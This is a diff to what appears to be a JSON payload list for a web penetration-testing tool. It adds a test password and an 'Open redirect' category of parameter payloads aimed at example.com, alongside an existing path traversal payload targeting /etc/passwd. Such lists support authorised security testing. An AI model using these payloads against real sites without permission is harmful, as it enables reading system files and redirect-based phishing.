@@ -21,6 +21,10 @@
       {
         "key": "{title: {toString: null}",
         "value": "{\"title\": {\"toString\": null}}"
+      },
+      {
+        "key": "pass",
+        "value": "pentest123"
       }
     ]
   },
@@ -72,6 +76,47 @@
       {
         "key": "etcpasswd",
         "value": "../../../../../../../../../../../../etc/passwd"
+      }
+    ]
+  },
+  {
+    "type": "Open redirect",
+    "items": [
+      {
+        "key": "url",
+        "value": "url=http://example.com"
+      },
+      {
+        "key": "next",
+        "value": "next=http://example.com"
+      },
+      {
+        "key": "view",
+        "value": "view=http://example.com"
+      },
+      {
+        "key": "ref_url",
+        "value": "ref_url=http://example.com"
+      },
+      {
+        "key": "redirect_to",
+        "value": "redirect_to=http://example.com"
+      },
+      {
+        "key": "/login?to=",
+        "value": "/login?to=http://example.com"
+      },
+      {
+        "key": "/login?checkout_url=",
+        "value": "/login?checkout_url=http://example.com"
+      },
+      {
+        "key": "/redirect/url",
+        "value": "/redirect/http://exapmle.com"
+      },
+      {
+        "key": "/out/url",
+        "value": "/out/http://exapmle.com"
       }
     ]
   },
